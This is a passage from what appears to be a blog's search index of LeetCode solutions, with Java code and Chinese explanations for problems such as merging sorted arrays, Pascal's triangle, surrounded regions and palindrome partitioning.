class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i : map)</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) required++;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 左右指针</span></span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 窗口长度，窗口的左边</span></span><br><span class="line">    <span class="keyword">int</span> minLength = Integer.MAX_VALUE, minLeft = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (r &lt; s.length()) &#123;</span><br><span class="line">        <span class="comment">// 把当前字符加入到窗口中</span></span><br><span class="line">        <span class="keyword">char</span> c = s.charAt(r);</span><br><span class="line">        map[c]--;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果当前字符在滑动窗口中的出现的个数等于需要的个数，那么把需要匹配的字符数required减去1</span></span><br><span class="line">        <span class="keyword">if</span> (map[c] == <span class="number">0</span>) required--;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试收缩滑动窗口，直到最佳</span></span><br><span class="line">        <span class="keyword">while</span> (required == <span class="number">0</span>) &#123;</span><br><span class="line">            c = s.charAt(l);</span><br><span class="line">            <span class="comment">// 保存当前窗口</span></span><br><span class="line">            <span class="keyword">if</span> (r - l + <span class="number">1</span> &lt; minLength) &#123;</span><br><span class="line">                minLength = r - l + <span class="number">1</span>;</span><br><span class="line">                minLeft = l;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 由于窗口缩小了，需要最左边字符的数量加1</span></span><br><span class="line">            map[c]++;</span><br><span class="line">            <span class="comment">// 字符数量不等于0，表明需要匹配的字符数required加1，滑动窗口不再符合</span></span><br><span class="line">            <span class="keyword">if</span> (map[c] &gt; <span class="number">0</span>) required++;</span><br><span class="line">            <span class="comment">// 移动左指针向前，寻找一个新的窗口</span></span><br><span class="line">            l++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当收缩窗口完成以后，继续扩展窗口</span></span><br><span class="line">        r++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> minLength == Integer.MAX_VALUE ? <span class="string">""</span> : s.substring(minLeft, minLeft + minLength);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[88. Merge Sorted Array]]></title>
      <url>/wiki/2017/10/10/Leetcode-88-Merge-Sorted-Array/</url>
      <content type="html"><![CDATA[<p>Given two sorted integer arrays <em>nums1</em> and <em>nums2</em>, merge <em>nums2</em> into <em>nums1</em> as one sorted array.</p>
<p>Note:</p>
<ul>
<li>The number of elements initialized in <em>nums1</em> and <em>nums2</em> are <em>m</em> and <em>n</em> respectively.</li>
<li>You may assume that <em>nums1</em> has enough space (size that is greater or equal to <em>m + n</em>) to hold additional elements from <em>nums2</em>.</li>
</ul>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">nums1 = [1,2,3,0,0,0], m = 3</span><br><span class="line">nums2 = [2,5,6],       n = 3</span><br><span class="line"></span><br><span class="line">Output: [1,2,2,3,5,6]</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>采用两个指针l1,l2分别指向nums1,nums2的尾部，依次把比较大的元素加入到nums1的后部。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> l1 = m - <span class="number">1</span>, l2 = n - <span class="number">1</span>, k = l1 + l2 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l1 &gt;= <span class="number">0</span> || l2 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (l1 &gt;= <span class="number">0</span> &amp;&amp; l2 &gt;=<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums1[l1] &gt; nums2[l2]) nums1[k--] = nums1[l1--];</span><br><span class="line">                <span class="keyword">else</span> nums1[k--] = nums2[l2--];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (l2 &gt;= <span class="number">0</span>) nums1[k--] = nums2[l2--];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>; <span class="comment">// do nothing;</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Two Pointers </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[876. Middle of the Linked List]]></title>
      <url>/wiki/2017/10/10/Leetcode-876-Middle-of-the-Linked-List/</url>
      <content type="html"><![CDATA[<p>Given a non-empty, singly linked list with head node <code>head</code>, return a middle node of linked list.</p>
<p>If there are two middle nodes, return the second middle node.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3,4,5]</span><br><span class="line">Output: Node 3 from this list (Serialization: [3,4,5])</span><br><span class="line">The returned node has value 3.  (The judge&apos;s serialization of this node is [3,4,5]).</span><br><span class="line">Note that we returned a ListNode object ans, such that:</span><br><span class="line">ans.val = 3, ans.next.val = 4, ans.next.next.val = 5, and ans.next.next.next = NULL.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3,4,5,6]</span><br><span class="line">Output: Node 4 from this list (Serialization: [4,5,6])</span><br><span class="line">Since the list has two middle nodes with values 3 and 4, we return the second one.</span><br></pre></td></tr></table></figure>
<p>Note: The number of nodes in the given list will be between <code>1</code> and <code>100</code>.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>使用快指针和慢指针。一开始，它们都指向链表头部，快指针每次移动两步，慢指针每次移动一步。当快指针不能再移动时，也就是到达链表尾部时，慢指针的位置就是链表的中间位置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">middleNode</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode fast = head, slow = head;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[118. Pascal's Triangle]]></title>
      <url>/wiki/2017/10/10/Leetcode-118-Pascal-s-Triangle/</url>
      <content type="html"><![CDATA[<p>Given a non-negative integer <em>numRows</em>, generate the first <em>numRows</em> of Pascal’s triangle.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/PascalTriangleAnimated2.gif?imageslim" alt="PascalTriangleAnimated2"></p>
<p><small>In Pascal’s triangle, each number is the sum of the two numbers directly above it.</small></p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: 5</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">     [1],</span><br><span class="line">    [1,1],</span><br><span class="line">   [1,2,1],</span><br><span class="line">  [1,3,3,1],</span><br><span class="line"> [1,4,6,4,1]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>根据动画中的步骤，一层一层构建矩阵。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; generate(<span class="keyword">int</span> numRows) &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;(), prev = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) prev = res.get(i - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span> || j == i) list.add(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">else</span> list.add(prev.get(j-<span class="number">1</span>) + prev.get(j));</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[119. Pascal's Triangle II]]></title>
      <url>/wiki/2017/10/10/Leetcode-119-Pascal-s-Triangle-II/</url>
      <content type="html"><![CDATA[<p>Given a non-negative index $k$ where $k \le 33$, return the $k^{th}$ index row of the Pascal’s triangle.</p>
<p>Note that the row index starts from 0.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/PascalTriangleAnimated2.gif?imageslim" alt="PascalTriangleAnimated2"></p>
<p><small>In Pascal’s triangle, each number is the sum of the two numbers directly above it.</small></p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: [1,3,3,1]</span><br></pre></td></tr></table></figure>
<p><strong>Follow up</strong>:</p>
<p>Could you optimize your algorithm to use only $O(k)$ extra space?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>一开始写的笨办法，保存需要求和的两个值，轮流更新。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">getRow</span><span class="params">(<span class="keyword">int</span> rowIndex)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> prev = <span class="number">1</span>, before = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= rowIndex; i++) &#123;</span><br><span class="line">        res.add(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">            prev  = res.get(j);</span><br><span class="line">            <span class="keyword">if</span> (!(j == <span class="number">0</span> || j == i))</span><br><span class="line">                res.set(j, prev + before);</span><br><span class="line">            before = prev;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比较好的办法是内循环从后往前面遍历，保证了值没有被覆盖掉。</p>
<ul>
<li>row0 = 1</li>
<li>row1 = (row0[0]), (row1[1] + row0[0]) = 1, 1</li>
<li>row2 = (row0[0]), (row1[1] + row1[0]), (row2[2] + row1[1]) = 1, 2, 1</li>
<li>row3 = (row0[0]), (row2[1] + row2[0]), (row2[2] + row2[1]). (row3[3] + row2[2]) = 1, 3, 3, 1</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">getRow</span><span class="params">(<span class="keyword">int</span> rowIndex)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;(rowIndex + <span class="number">1</span>);</span><br><span class="line">    res.add(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= rowIndex; i++) &#123;</span><br><span class="line">        res.add(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &gt;= <span class="number">1</span>; j--)</span><br><span class="line">            res.set(j, res.get(j) + res.get(j - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[130. Surrounded Regions]]></title>
      <url>/wiki/2017/10/10/Leetcode-130-Surrounded-Regions/</url>
      <content type="html"><![CDATA[<p>Given a 2D board containing <code>&#39;X&#39;</code> and <code>&#39;O&#39;</code> (the letter O), capture all regions surrounded by <code>&#39;X&#39;</code>.</p>
<p>A region is captured by flipping all <code>&#39;O&#39;</code>s into <code>&#39;X&#39;</code>s in that surrounded region.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X X X X</span><br><span class="line">X O O X</span><br><span class="line">X X O X</span><br><span class="line">X O X X</span><br></pre></td></tr></table></figure>
<p>After running your function, the board should be:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X X X X</span><br><span class="line">X X X X</span><br><span class="line">X X X X</span><br><span class="line">X O X X</span><br></pre></td></tr></table></figure>
<p>Explanation:</p>
<p>Surrounded regions shouldn’t be on the border, which means that any <code>&#39;O&#39;</code> on the border of the board are not flipped to <code>&#39;X&#39;</code>. Any <code>&#39;O&#39;</code> that is not on the border and it is not connected to an <code>&#39;O&#39;</code> on the border will be flipped to <code>&#39;X&#39;</code>. Two cells are connected if they are adjacent cells connected horizontally or vertically.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题其实思路是非常简单的：把二维数组放在UnionFind集合中，当出现’O’时，将’O’附近的’O’连接起来，形成connected component. 那么怎么判断’O’是否被围起来了呢？这里采用在原来数组外增加一圈’O’的方法，只需判断该’O’是否和外圈的’O’连接，来判断’O’是否被围起来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q130SurroundedRegions</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">char</span>[][] board)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// corner case</span></span><br><span class="line">        <span class="keyword">if</span> (board.length &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = board.length;</span><br><span class="line">        <span class="keyword">int</span> m = board[<span class="number">0</span>].length;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// corner case</span></span><br><span class="line">        <span class="keyword">if</span> ( m &lt; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// add virtual points surronds board</span></span><br><span class="line">        <span class="keyword">int</span> nn = n + <span class="number">2</span>, mm = m + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">char</span>[][] virtualBoard = <span class="keyword">new</span> <span class="keyword">char</span>[nn][mm];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nn; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; mm; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span> || j == <span class="number">0</span> || j == mm - <span class="number">1</span> || i == nn - <span class="number">1</span>) &#123;</span><br><span class="line">                    virtualBoard[i][j] = <span class="string">'O'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    virtualBoard[i][j] = board[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// add union find data structure, 0 as virtual point</span></span><br><span class="line">        WeightedPathCompressionQuickFind  uf = <span class="keyword">new</span> WeightedPathCompressionQuickFind(nn*mm);</span><br><span class="line">        <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nn; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; mm; j++) &#123;</span><br><span class="line">                index = i * mm + j;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (virtualBoard[i][j] == <span class="string">'O'</span>) &#123;</span><br><span class="line">                    <span class="comment">// find adject 'O'</span></span><br><span class="line">                    <span class="keyword">if</span> ((j &gt; <span class="number">0</span>) &amp;&amp; (virtualBoard[i][j-<span class="number">1</span>] == <span class="string">'O'</span>)) &#123; <span class="comment">//left</span></span><br><span class="line">                        uf.union(index, index - <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ((j &lt; m - <span class="number">1</span>) &amp;&amp; (virtualBoard[i][j + <span class="number">1</span>] == <span class="string">'O'</span>)) &#123; <span class="comment">// right</span></span><br><span class="line">                        uf.union(index, index + <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ((i &gt; <span class="number">0</span>) &amp;&amp; (virtualBoard[i-<span class="number">1</span>][j] == <span class="string">'O'</span>)) &#123; <span class="comment">// top</span></span><br><span class="line">                        uf.union(index, index - mm);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ((i &lt; n - <span class="number">1</span>) &amp;&amp; (virtualBoard[i+<span class="number">1</span>][j] == <span class="string">'O'</span>)) &#123; <span class="comment">// bottom</span></span><br><span class="line">                        uf.union(index, index  + mm);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// flip it  if  'O' is captured,</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; m - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                index = (i + <span class="number">1</span>) * mm + (j + <span class="number">1</span>); <span class="comment">// index on virtual board</span></span><br><span class="line">                <span class="keyword">if</span> ((board[i][j] == <span class="string">'O'</span>) &amp;&amp; (!uf.connected(<span class="number">0</span>, index))) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">'X'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Union Find </tag>
            
            <tag> Depth-First Search </tag>
            
            <tag> Breath-First Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[131. Palindrome Partitioning]]></title>
      <url>/wiki/2017/10/10/Leetcode-131-Palindrome-Partitioning/</url>
      <content type="html"><![CDATA[<p>Given a string $s$, partition $s$ such that every substring of the partition is a palindrome.</p>
<p>Return all possible palindrome partitioning of $s$.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;aab&quot;</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [&quot;aa&quot;,&quot;b&quot;],</span><br><span class="line">  [&quot;a&quot;,&quot;a&quot;,&quot;b&quot;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>比较规矩的回溯法的问题。注意细节即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;List&lt;String&gt;&gt; res;</span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; partition(String s) &#123;</span><br><span class="line">    res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    partitionHelper(<span class="keyword">new</span> ArrayList&lt;&gt;(), s);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">partitionHelper</span><span class="params">(ArrayList&lt;String&gt; list, String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() == <span class="number">0</span>) &#123;res.add(list); <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, n = s.length();</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= n) &#123;</span><br><span class="line">        String sub = s.substring(<span class="number">0</span>, i);</span><br><span class="line">        <span class="keyword">if</span> (!isValidPalindrome(sub)) &#123;i++; <span class="keyword">continue</span>;&#125;</span><br><span class="line">        list.add(sub);</span><br><span class="line">        partitionHelper((ArrayList&lt;String&gt;) list.clone(), s.substring(i, n));</span><br><span class="line">        list.remove(list.size() - <span class="number">1</span>);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isValidPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = s.length() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right)</span><br><span class="line">        <span class="keyword">if</span> (s.charAt(left++) != s.charAt(right--)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[867. Transpose Matrix]]></title>
      <url>/wiki/2017/10/10/Leetcode-867-Transpose-Matrix/</url>
      <content type="html"><![CDATA[<p>Given a matrix A, return the transpose of A.</p>
<p>The transpose of a matrix is the matrix flipped over it’s main diagonal, switching the row and column indices of the matrix.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,2,3],[4,5,6],[7,8,9]]</span><br><span class="line">Output: [[1,4,7],[2,5,8],[3,6,9]]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,2,3],[4,5,6]]</span><br><span class="line">Output: [[1,4],[2,5],[3,6]]</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ol>
<li>1 &lt;= A.length &lt;= 1000</li>
<li>1 &lt;= A[0].length &lt;= 1000</li>
</ol>
